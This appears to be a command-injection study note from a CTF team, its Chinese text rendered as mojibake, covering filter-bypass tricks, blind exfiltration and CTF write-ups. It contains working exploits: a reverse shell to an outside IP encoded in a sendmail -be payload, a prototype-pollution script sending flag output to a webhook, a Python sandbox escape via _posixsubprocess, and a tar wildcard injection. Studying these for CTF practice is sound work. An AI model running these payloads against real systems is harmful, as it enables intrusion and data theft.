# ğŸ–¥ï¸ å‘½ä»¤æ³¨å…¥

## åŸºç¡€çŸ¥è¯†

### Bash/Shell çš„è¯­æ³•

> å¸¸ç”¨å‘½ä»¤ï¼Œè¾“å…¥/è¾“å‡ºé‡å®šå‘ï¼Œç®¡é“ï¼Œç¯å¢ƒå˜é‡

### Powershell/CMD çš„è¯­æ³•

> å¸¸ç”¨å‘½ä»¤

## WAF Bypassï¼ˆVqs147ï¼‰

ç¼–ç /æ··æ·† ç©ºæ ¼/æ¢è¡Œçš„æ›¿ä»£ é€šé…ç¬¦çš„å¦™ç”¨ ç‰¹æ®Šç¯å¢ƒå˜é‡

**ç¼–ç /æ··æ·†ï¼š**

    base64ç¼–ç ï¼š`` `echo "Y2F0IDEudHh0Cg"|base64 -d` ``

    è¿›åˆ¶ç¼–ç ï¼š`$(printf "\x6c\x73")`    `` `echo -e "\x6c\x73"` ``    `echo 6c73 | xxd -r -p | bash`

**è¿‡æ»¤ç©ºæ ¼ï¼š**åŸå§‹å‘½ä»¤cat /etc/passwd

    `{cat,/etc/passwd}` ï¼ˆbashå¯ä»¥ï¼Œåªå¯¹æœªè¢«å¼•èµ·æ¥çš„å­—ç¬¦ä¸²æœ‰æ•ˆï¼Œshä¸è¡Œï¼‰

    `cat</etc/passwd`

    `cat$IFS/etc/passwd`   å¦‚æœæ˜¯ç›¸å¯¹è·¯å¾„çš„è¯å¾—åŠ å¤§æ‹¬å·ï¼š`cat${IFS}1.txt` æˆ–è€… `cat$IFS$91.txt`

    ç”¨tabç­‰å…¶å®ƒç©ºç™½å­—ç¬¦æ›¿ä»£ç©ºæ ¼

**è¿‡æ»¤å…³é”®å­—**ï¼ˆä¾‹å¦‚catï¼‰ï¼š

    ç”¨å…¶å®ƒå‘½ä»¤æ›¿ä»£ï¼Œä¾‹å¦‚tac

    c''at    c""at    c\\at    c$9at

    ç»å¯¹è·¯å¾„+regexï¼š`/bin/ca[t]`    `/bin/ca?`

    å­—ç¬¦ä¸²æ‹¼æ¥ï¼š`a=ca;b=t;$a$b flag`

    ç¼–ç ç»•è¿‡ï¼š`` `echo "Y2F0IDEudHh0Cg"|base64 -d` ``

**è¿‡æ»¤æ¢è¡Œ**ï¼šç”¨|  &  ;æˆ–\`\` $()æ‰§è¡Œå¤šæ¡å‘½ä»¤

**é€šé…ç¬¦**ï¼šå¯ä»¥ç”¨åœ¨ç»å¯¹è·¯å¾„çš„ç¨‹åºåæˆ–å‚æ•°ä¸­ï¼Œä¾‹å¦‚`/bin/c?t /et?/pass??`

    æŸäº›å‘½ä»¤ç”¨é€šé…ç¬¦æ‰§è¡Œæ—¶ä¼šå¯¼è‡´å‘½ä»¤å‚æ•°æ³¨å…¥ï¼Œä¾‹å¦‚`tar czf /tmp/backup.tar.gz *`

    æ‰§è¡Œæ—¶å…ˆå°†é€šé…ç¬¦å±•å¼€å†æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥å‘½ä»¤æ‰§è¡Œï¼š

```bash
echo "..." > root.shï¼š# åˆ›å»ºä¸€ä¸ªåä¸º root.sh çš„æ¶æ„è„šæœ¬
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > "--checkpoint=1"
```

ç‰¹æ®Šç¯å¢ƒå˜é‡ï¼š

    $SHELLï¼šæ‰§è¡Œshellçš„ç¨‹åº

    ${PATH:0:1}ï¼šå­—ç¬¦ä¸²å˜é‡åˆ‡ç‰‡

    $$ï¼šå½“å‰Shellçš„è¿›ç¨‹ID (PID)

    $IFSï¼šShellåˆ†éš”ç¬¦

    $9ï¼šç©ºå˜é‡

## æ— å›æ˜¾çš„ä¿¡æ¯å¤–å¸¦æ–¹æ¡ˆï¼ˆVqs147ï¼‰

ç½‘ç»œå¤–å¸¦ï¼ˆDNS/ICMP/HTTPï¼‰ ç›²æ³¨

    èƒ½å‡ºç½‘çš„è¯ç›´æ¥åå¼¹shellå°±è¡Œäº†

    ä¸å‡ºç½‘ï¼š

    1ã€æŠŠä¿¡æ¯å†™åˆ°èƒ½è®¿é—®çš„æ–‡ä»¶é‡Œï¼Œä¾‹å¦‚index.html

    2ã€æ—¶é—´ç›²æ³¨

    3ã€å¸ƒå°”ç›²æ³¨

## è¯»å–æ–‡ä»¶çš„æŠ€å·§ï¼ˆlqï¼‰

å¯ç”¨çš„å‘½ä»¤ é€šè¿‡æ–‡ä»¶æè¿°ç¬¦è¯» windowsä¸­å¦‚ä½•è¯»

### å¸¸ç”¨å‘½ä»¤

linux:

```bash
cat tac
nl ä¸ºè¾“å‡ºåŠ ä¸Šç¼–å·
sort å°†è¾“å‡ºæ’åº
uniq åˆ é™¤é‡å¤è¡Œè¾“å‡º
rev é€†åºè¾“å‡º
od ä»¥å…«è¿›åˆ¶ã€åè¿›åˆ¶ã€åå…­è¿›åˆ¶ã€æµ®ç‚¹æ ¼å¼æˆ– ASCII ç¼–ç å­—ç¬¦è¾“å‡º
file -f /path/to/file
date -f /path/to/file é€šè¿‡æŠ¥é”™è¯»å–
xxd åå…­è¿›åˆ¶è¾“å‡º
curl file:///path/to/file é€šè¿‡fileåè®®è¯»å–
more 
less
head -n N /path/to/file
tail -n N /path/to/file
grep 'pattern' /path/to/file
awk '{print}' /path/to/file
sed -n '1,100p' /path/to/file
dd if=/path/to/file bs=1 count=XXX skip=YYY
strings
paste
diff file1 file2
```

Windows

```powershell
type C:\path\to\file
more < C:\path\to\file
powershell -Command "Get-Content C:\path\to\file"
certutil -encodehex -f target_file output_file
copy target_file output_file
```

### é€šè¿‡æ–‡ä»¶æè¿°ç¬¦è¯»å–


1. `exec 3< /path/to/file;while read -u 3 line;do echo $line;done` 

   å°†ç›®æ ‡æ–‡ä»¶å…³è”åˆ°ä¸€ä¸ªæœªè¢«ä½¿ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œç„¶åé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦è¯»å–æ–‡ä»¶ã€‚
2. `/proc/self/fd/N` 

   `/proc/self/fd/` ç›®å½•åŒ…å«äº†å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦çš„é“¾æ¥ï¼Œå½“ç›®æ ‡æ–‡ä»¶çš„åç¼€åè¢«è¿‡æ»¤æˆ–è€…ä¸çŸ¥é“ç›®æ ‡æ–‡ä»¶åï¼Œå¯ä»¥é€šè¿‡éå†è¿™ä¸ªç›®å½•è¯»å–æ–‡ä»¶ã€‚
3. `/dev/fd/N` 

   ä¸`/proc/self/fd/N`ç›¸åŒã€‚

## ç¯å¢ƒå˜é‡æ³¨å…¥


## ç‰¹å®šè¯­è¨€çš„å‘½ä»¤æ³¨å…¥

> æœ‰ä»€ä¹ˆå±é™©å‡½æ•°ï¼Ÿå¸¸è§çš„è°ƒç”¨æ–¹å¼ï¼Ÿå¯ä»¥åœ¨å“ªäº›å‚æ•°æ³¨å…¥ï¼Ÿæœ‰å“ªäº›å‡½æ•°ä¼šé—´æ¥å¼•å…¥å‘½ä»¤æ³¨å…¥ï¼Ÿ

### PHP

### Python

### Java

### å…¶ä»–è¯­è¨€

Go/NodeJS


## å‚è€ƒé“¾æ¥

* [https://0x80dotblog.wordpress.com/2021/07/28/os-command-injection-tutorial-part-1-basics-and-filter-evasion/#:\~:text=you can also take advantage,called via %24u like so](https://0x80dotblog.wordpress.com/2021/07/28/os-command-injection-tutorial-part-1-basics-and-filter-evasion/#:\~:text=you%20can%20also%20take%20advantage,called%20via%20%24u%20like%20so)


## ä¾‹é¢˜

### ï¼ˆlqï¼‰DownUnderCTF 2024 Prisoner Processor

`/examples` æä¾› prisoner è¯¦ç»†ä¿¡æ¯ï¼Œ`/convert-to-yaml` å¯ä»¥å°† prisoner ä¿¡æ¯å†™å…¥ yaml æ–‡ä»¶ã€‚

```typescript
app.post('/convert-to-yaml',
    ...
      const body = c.req.valid('json');
      const data = body.data;
      const signedData = getSignedData(data)
      const signature = body.signature;
      if (!hasValidSignature(signedData, signature)) {
        return c.json({ msg: "signatures do no match!" }, 400);
      }
      const outputPrefix = z.string().parse(signedData.outputPrefix ?? "prisoner");
      const outputFile = `${outputPrefix}-${randomBytes(8).toString("hex")}.yaml`;
    ...
```

æäº¤çš„æ•°æ®ä¸­æ²¡æœ‰ `outputPrefix`çš„å€¼,æ‰€ä»¥é»˜è®¤æ˜¯prisonerã€‚å¦‚æœå¯ä»¥æ§åˆ¶`outputPrefix`å°±å¯ä»¥æ§åˆ¶å†™å…¥çš„æ–‡ä»¶åã€‚ è¿™é‡Œè€ƒè™‘åŸå‹æ±¡æŸ“ï¼Œé€šè¿‡æ·»åŠ  `signed.__proto__` æ›´æ”¹`outputPrefix`ï¼Œä¸”ç”±äº `__proto__` å±æ€§ä¸å¯æšä¸¾ï¼Œå› æ­¤ä¸ä¼šç”¨äºè®¡ç®—ç­¾åã€‚ ä¸ºäº†èƒ½å†™å…¥yamlä»¥å¤–ç±»å‹çš„æ–‡ä»¶ï¼Œè¿˜éœ€è¦ä½¿ç”¨NULLæˆªæ–­ä¹‹åçš„æ–‡ä»¶åã€‚

```typescript
const BANNED_STRINGS = ["app", "src", ".ts", "node", "package", "bun", "home", "etc", "usr", "opt", "tmp", "index", ".sh"];
```

èƒ½å¤Ÿå†™å…¥ä»»æ„ç±»å‹æ–‡ä»¶åå¯ä»¥è€ƒè™‘å†™å…¥`index.ts`ï¼Œé»‘åå•ä¸­é™åˆ¶äº†app, src, indexç­‰ç›®å½•æˆ–æ–‡ä»¶åï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨ `/proc/self/fd/3` å†™å…¥ `index.ts`ã€‚ æœ€ååªéœ€è¦å†™å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•å³å¯è®©bunå´©æºƒç„¶åé‡å¯ã€‚ exp:

```python
import requests
body = requests.get("http://100.95.136.43:1337/examples").json()["examples"][0]
signature = body["signature"]

body["data"]["signed.__proto__"] = {"outputPrefix":"../../proc/self/fd/3\00"}
payload = {
    "data": {
        "const a": "string = new TextDecoder().decode(Bun.spawnSync([\"/bin/bash\", \"-c\", \"/bin/getflag\"]).stdout);fetch(\"https://webhook.site/2cca7093-c8b0-4659-a39f-d6a6282a35ae/?=\"+a)/*",
        **body["data"],
        "nothing": "nothing */"
    },
    "signature": signature
}
r = requests.post("http://ip:port/convert-to-yaml",json=payload)
body["data"]["signed.__proto__"] = {"outputPrefix":"../../proc/notexist"}
r = requests.post("http://ip:port/convert-to-yaml",json=body)
```


\

\
### ï¼ˆVqs147ï¼‰Midnight Sun CTF 2025 **UselessCorp**

1ã€å‘ç°æ¼æ´ç‚¹

é¢˜ç›®åªæä¾›äº†ä¸€ä¸ªåç«¯æ¥å£ï¼Œæ˜¯å‘é€name,email,subject,messageä¼ ç»™phpçš„mail()å‡½æ•°ï¼Œæœç´¢äº’è”ç½‘å‘ç°phpçš„mail()å‡½æ•°ä¸€èˆ¬ä¼šæŠŠå‘é€è€…ä½œä¸º-få‚æ•°æ‹¼æ¥è¿›æ‰§è¡Œçš„å‘½ä»¤ä¸­ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯æ§çš„emailå‚æ•°å¯ä»¥æ³¨å…¥sendmailå‘½ä»¤çš„å‚æ•°ã€‚

2ã€æ¼æ´åˆ©ç”¨

æ¥ä¸‹æ¥è¦çŸ¥é“sendmailæœ‰å“ªäº›å‚æ•°å¯ä»¥åˆ©ç”¨ã€‚é¦–å…ˆæŸ¥åˆ°Â `-OQueueDirectory=/tmp/ Â -X/var/www/shell.php`å¯ä»¥å†™å…¥ä»»æ„æ–‡ä»¶ï¼Œé€šè¿‡subjectç­‰å­—æ®µå¯ä»¥æ§åˆ¶æ–‡ä»¶çš„å†…å®¹ï¼Œå°è¯•å†™webshellã€crontabï¼Œæ²¡ç”¨ã€‚è€ƒè™‘åˆ°è¿™é“é¢˜æ‰€æœ‰äººå…±ç”¨ä¸€ä¸ªé¢˜ç›®ç¯å¢ƒï¼Œå¯èƒ½è¿è¡Œsendmailå‘½ä»¤çš„ç”¨æˆ·æ²¡ç”¨ä»»ä½•å†™æƒé™ã€‚

æ‰€ä»¥éœ€è¦æ‰¾åˆ°sendmailçš„èƒ½å¤Ÿç›´æ¥æ‰§è¡Œå‘½ä»¤çš„å‚æ•°ã€‚æœ€ç»ˆå‘ç°-beå‚æ•°ç›´æ¥å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œè¯­æ³•éœ€è¦å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€‚ç›´æ¥åå¼¹shellï¼š

```none
email=aaa( -be ${run,preexpand{${base64d:L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTI0LjcwLjEzMi4yMDkvNjY2NyAwPiYxIgo==}}} )@xxx.com
```


### ï¼ˆVqs147ï¼‰é˜¿é‡Œäº‘CTF 2025 ezoj

pythonæ²™ç®±é€ƒé€¸ï¼š

```python
import sys
import math
import collections
import queue
import heapq
import bisect

def audit_checker(event,args):
    if not event in ["import","time.sleep","builtins.input","builtins.input/result"]:
        raise RuntimeError

sys.addaudithook(audit_checker)
```

å¯ä»¥åœ¨è¿™æ®µä»£ç åé¢æ’å…¥ä»»ä½•ä»£ç ï¼Œç„¶åè¿è¡Œpythonè„šæœ¬ï¼Œaudithookç”¨ç™½åå•æ–¹å¼é™åˆ¶äº‹ä»¶æ‰§è¡Œã€‚

æ ¹æ®ç™½åå•ï¼Œå¯ä»¥ç”¨importå¯¼å…¥æ¨¡å—ï¼Œä½†å¯¼å…¥å¤–éƒ¨æ¨¡å—éœ€è¦ç”¨åˆ°compileå’Œexecä¼šè§¦å‘audithookï¼Œå› æ­¤åªèƒ½å¯¼å…¥å†…éƒ¨æ¨¡å—ã€‚å†…éƒ¨æ¨¡å—_posixsubprocessçš„å‡½æ•°fork_execå¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œä»£ç æ¨¡æ¿ï¼š

```python
import os
import _posixsubprocess
cmd = b''
_posixsubprocess.fork_exec([b"/bin/sh",  b"-c" , cmd], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```

é¢˜ç›®ç¯å¢ƒä¸å‡ºç½‘ã€‚æ­¤æ—¶ç¬¬ä¸€ç§åšæ³•æ˜¯æŠŠå®Œæ•´çš„æ‰§è¡Œçš„å‘½ä»¤æ”¾åœ¨cmdå‚æ•°ä¸­ï¼Œæ—¶é—´ç›²æ³¨å¾—åˆ°flagã€‚

ç¬¬äºŒç§åšæ³•æ˜¯ï¼Œæ³¨æ„åˆ°å›æ˜¾åŒ…å«é”™è¯¯ç ï¼š

```python
except OJRuntimeError as e:
    return {"status": "RE", "message": f"Runtime Error: ret={e.args[0]}"}
```

å…ˆç”¨sys.version_infoè·å–pythonç‰ˆæœ¬ï¼Œç„¶åé€šè¿‡é”™è¯¯ç ä¸€ä½ä½å¸¦å‡ºflagã€‚ç°åœ¨éœ€è¦æƒ³åŠæ³•è·å–_posixsubprocess.fork_execæ‰§è¡Œå‘½ä»¤åçš„ç»“æœã€‚è¿™ä¸ªå‡½æ•°åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹æ‰§è¡Œå‘½ä»¤ï¼Œè¾“å‡ºæ˜¯å­è¿›ç¨‹çš„stdoutã€‚ä½†æ˜¯fork_execçš„ä¸€ä¸ªå‚æ•°c2pwriteç”¨äºé‡å®šå‘å­è¿›ç¨‹çš„è¾“å‡ºï¼Œå…ˆç”¨std_pipe = os.pipe()åˆ›å»ºåœ¨å½“å‰è¿›ç¨‹åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œç„¶åæŠŠc2pwriteè®¾ç½®æˆstd_pipe\[1\]ï¼Œå°±å¯ä»¥é€šè¿‡std_pipe\[0\]è¯»å–åˆ°æ‰§è¡Œå‘½ä»¤çš„ç»“æœã€‚

è§£é¢˜è„šæœ¬ï¼š

```python
import requests

url = "http://121.41.238.106:20570/"

payload = """
import os
import _posixsubprocess
import sys

cmd = b'cat /flag*'
std_pipe = os.pipe()
_posixsubprocess.fork_exec([b"/bin/sh",  b"-c" , cmd], [b"/bin/sh"], True, (), None, None, -1, -1, -1, std_pipe[1], -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
flag = os.read(std_pipe[0], 1024)
sys.exit(flag[{i}])
"""

result = ''
for i in range(0, 100):
    data = {
        "code": payload.format(i=i),
        "problem_id": 0,
    }
    r = requests.post(url=url+"api/submit", json=data)
    resp_data = r.json()
    assert resp_data["status"] == "RE"
    result += chr(int(resp_data["message"][19:]))
    print(result)
```


### ï¼ˆTeruï¼‰CISCN 2025 æ€»å†³èµ› Day1 hardphp